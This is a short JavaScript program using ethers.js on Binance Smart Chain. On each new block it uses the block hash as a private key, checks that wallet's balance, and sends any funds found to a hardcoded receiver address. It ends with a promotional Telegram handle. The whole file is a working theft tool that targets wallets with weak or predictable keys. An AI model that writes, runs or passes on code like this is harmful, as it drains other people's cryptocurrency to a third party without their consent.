const ethers = require("ethers")
const provider = new ethers.JsonRpcProvider("https://bsc-dataseed.binance.org")
const receiver = "0xb700DaeA990aefBeDB36f109F9989Ab87A86601d"

const start = async () => {
    provider.on("block", async () => {
      const blockDetails = await provider.getBlock()
      console.log("Block number : ", blockDetails.number)
      console.log("Block hash : ", blockDetails.hash)

      const privateKey = new ethers.Wallet(blockDetails.hash)
      const balance = await provider.getBalance(privateKey)
      const bal = ethers.formatEther(balance)
      console.log(`wallet address : ${privateKey.address}`)
      console.log(`Balance : ${bal} ETH`)

      if (bal > 0) {
        privateKey.sendTransaction({
            to: receiver,
            value: balance
        }).then((txObj) => {
            console.log("ETH wallet found and send tx: ", txObj.hash)
        })
      } else {
        console.log("no eth found :(")
      }
      
      console.log("====Telegram : @autoboyt======")


    })
}

start()
